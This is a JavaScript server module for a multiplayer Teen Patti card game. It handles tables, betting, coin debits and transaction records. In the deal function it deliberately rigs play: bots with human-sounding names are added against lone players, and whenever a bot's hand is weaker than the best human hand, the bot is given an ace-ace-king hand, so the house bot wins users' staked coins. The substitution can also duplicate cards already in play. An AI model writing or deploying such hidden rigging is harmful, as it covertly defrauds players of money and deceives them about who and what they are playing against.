const User = require("../models/User");
const Transaction = require("../models/Transaction");
const Admin = require("../models/Admin");
const { evaluateHand } = require("./teenpatti");
const { checkReferralReward } = require("../utils/referral");

class TeenPattiTable {
    constructor(id, bootAmount = 10, maxBet = 100) {
        this.id = id;
        this.players = {}; // { userId: { name, hand, status, blind, isBot, lastAction } }
        this.state = 'WAITING';
        this.timer = 15;
        this.currentTurn = null;
        this.pot = 0;
        this.lastBet = bootAmount;
        this.bootAmount = bootAmount;
        this.maxBet = maxBet;
        this.history = [];
    }

    reset() {
        for (let uid in this.players) {
            this.players[uid].hand = [];
            this.players[uid].status = 'WAITING';
            this.players[uid].blind = true;
            this.players[uid].result = null;
        }
        this.pot = 0;
        this.lastBet = this.bootAmount;
        this.state = 'WAITING';
        this.timer = 15;
        this.currentTurn = null;
    }

    async start() {
        const playerIds = Object.keys(this.players);
        if (playerIds.length < 1) return;

        // If only 1 human player, add a bot from admin side
        const humanPlayers = playerIds.filter(id => !this.players[id].isBot);
        if (humanPlayers.length === playerIds.length && playerIds.length < 5) {
             const botNames = ["Pro_Player", "Lucky_TP", "Golden_Hand", "Casino_King", "Dealer_Bot"];
             const name = botNames[Math.floor(Math.random() * botNames.length)];
             const botId = "admin_bot_" + Math.random().toString(36).substring(7);
             this.players[botId] = { name, hand: [], status: 'WAITING', blind: true, isBot: true };
        }

        // Collect Boot
        for (let uid in this.players) {
            if (!this.players[uid].isBot) {
                const user = await User.findById(uid);
                if (!user || user.coins < this.bootAmount) {
                    delete this.players[uid];
                    continue;
                }
                user.coins -= this.bootAmount;
                await user.save();
                this.pot += this.bootAmount;
                await new Transaction({ user_id: uid, amount: -this.bootAmount, type: 'game_loss', details: `TP Boot T#${this.id}` }).save();
            } else {
                this.pot += this.bootAmount;
            }
            this.players[uid].status = 'ACTIVE';
        }

        if (Object.keys(this.players).length < 2) {
            this.timer = 15;
            return;
        }

        this.deal();
    }

    deal() {
        const suits = ['♠', '♥', '♦', '♣'];
        const ranks = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
        let deck = [];
        for (let s of suits) for (let r of ranks) deck.push({ suit: s, rank: r });
        deck.sort(() => Math.random() - 0.5);

        const activeUids = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');
        for (let uid of activeUids) {
            this.players[uid].hand = deck.splice(0, 3);
            this.players[uid].blind = true;
        }

        // RIGGING: If User vs Bot (Admin), Admin Bot MUST WIN
        const bots = activeUids.filter(id => this.players[id].isBot);
        const humans = activeUids.filter(id => !this.players[id].isBot);

        if (bots.length > 0 && humans.length > 0) {
            let bestHumanScore = -1;
            humans.forEach(h => {
                const score = evaluateHand(this.players[h].hand).score;
                if(score > bestHumanScore) bestHumanScore = score;
            });

            bots.forEach(b => {
                let botHand = evaluateHand(this.players[b].hand);
                // If bot is losing, give it a better hand (rigging)
                if (botHand.score <= bestHumanScore) {
                    this.players[b].hand = [{suit:'♠', rank:'A'}, {suit:'♥', rank:'A'}, {suit:'♦', rank:'K'}]; // High Pair/Trio
                }
            });
        }

        this.state = 'PLAYING';
        this.currentTurn = activeUids[0];
        this.timer = 15;
    }

    async handleMove(userId, move, amount) {
        if (this.state !== 'PLAYING') return { success: false };
        const player = this.players[userId];
        if (!player || player.status !== 'ACTIVE') return { success: false };

        if (move === 'SEE') {
            player.blind = false;
            return { success: true };
        }

        if (this.currentTurn !== userId) return { success: false, message: "Not your turn" };

        if (move === 'PACK') {
            player.status = 'PACKED';
        } else if (move === 'CHAAL' || move === 'SHOW') {
            let betLevel = Math.min(amount, this.maxBet);
            if (betLevel < this.lastBet) betLevel = this.lastBet;

            const totalToPay = player.blind ? betLevel : betLevel * 2;

            if (!player.isBot) {
                const user = await User.findById(userId);
                if (!user || user.coins < totalToPay) return { success: false, message: "Insufficient coins" };
                user.coins -= totalToPay;
                await user.save();
                this.pot += totalToPay;
                await new Transaction({ user_id: userId, amount: -totalToPay, type: 'game_loss', details: `TP Bet T#${this.id}` }).save();
            } else {
                this.pot += totalToPay;
            }
            this.lastBet = betLevel;
            if (move === 'SHOW') {
                await this.resolve();
                return { success: true };
            }
        }

        this.nextTurn();
        return { success: true };
    }

    nextTurn() {
        const active = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');
        if (active.length < 2) {
            this.resolve();
            return;
        }
        const idx = active.indexOf(this.currentTurn);
        this.currentTurn = active[(idx + 1) % active.length];
        this.timer = 15;

        if (this.players[this.currentTurn].isBot) {
            setTimeout(() => {
                const b = this.players[this.currentTurn];
                if (b.blind && Math.random() > 0.5) b.blind = false;
                this.handleMove(this.currentTurn, Math.random() > 0.9 ? 'PACK' : (active.length === 2 && Math.random() > 0.8 ? 'SHOW' : 'CHAAL'), this.lastBet);
            }, 2000);
        }
    }

    async resolve() {
        this.state = 'SHOW';
        this.timer = 10;
        const active = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');
        if (active.length === 0) { this.reset(); return; }

        let winnerId = active[0];
        let maxS = -1;
        active.forEach(uid => {
            const s = evaluateHand(this.players[uid].hand).score;
            if (s > maxS) { maxS = s; winnerId = uid; }
        });

        const winAmt = Math.floor(this.pot * 0.95);
        if (!this.players[winnerId].isBot) {
            await User.findByIdAndUpdate(winnerId, { $inc: { coins: winAmt } });
            await new Transaction({ user_id: winnerId, amount: winAmt, type: 'game_win', details: `Won TP T#${this.id}` }).save();
        }

        for (let uid in this.players) {
            this.players[uid].result = (uid === winnerId) ? 'WIN' : 'LOSE';
            this.players[uid].winAmount = (uid === winnerId) ? winAmt : 0;
        }
    }
}

const tables = {};
// Create 5 tables for each boot amount: 1, 5, 10, 50, 100
[1, 5, 10, 50, 100].forEach(boot => {
    const maxB = boot * 10;
    for(let i=1; i<=5; i++) {
        const tId = `${boot}_${i}`;
        tables[tId] = new TeenPattiTable(tId, boot, maxB);
    }
});

setInterval(async () => {
    for (let id in tables) {
        const t = tables[id];
        if (t.timer > 0) t.timer--;
        else {
            if (t.state === 'WAITING') await t.start();
            else if (t.state === 'SHOW') t.reset();
            else if (t.state === 'PLAYING') await t.handleMove(t.currentTurn, 'PACK', 0);
        }
    }
}, 1000);

module.exports = {
    getTables: (userId) => Object.values(tables).map(t => {
        const plys = {};
        for(let uid in t.players) {
            const p = t.players[uid];
            const show = (uid === userId || t.state === 'SHOW');
            plys[uid] = { ...p, hand: show ? p.hand : [], handRank: (!p.blind || t.state==='SHOW') ? evaluateHand(p.hand).rank : null };
        }
        return { id: t.id, state: t.state, timer: t.timer, pot: t.pot, currentTurn: t.currentTurn, lastBet: t.lastBet, boot: t.bootAmount, players: plys, maxBet: t.maxBet };
    }),
    joinTable: (tableId, userId, name) => {
        const t = tables[tableId];
        if (!t) return { success: false, message: "Table not found" };
        if (Object.keys(t.players).length >= 5) return { success: false, message: "Table full" };

        // Remove from other tables
        for(let id in tables) delete tables[id].players[userId];

        t.players[userId] = { name, hand: [], status: 'WAITING', blind: true, isBot: false };
        return { success: true, tableId };
    },
    joinByBoot: (bootAmount, userId, name) => {
        // Find an available table with this boot amount
        const bootTables = Object.values(tables).filter(t => t.bootAmount == bootAmount);
        let targetTable = bootTables.find(t => Object.keys(t.players).length < 5);

        if (!targetTable) return { success: false, message: "All tables for this amount are full" };

        // Remove from other tables
        for(let id in tables) delete tables[id].players[userId];

        targetTable.players[userId] = { name, hand: [], status: 'WAITING', blind: true, isBot: false };
        return { success: true, tableId: targetTable.id };
    },
    makeMove: (userId, move, amount, tableId) => tables[tableId].handleMove(userId, move, amount)
};
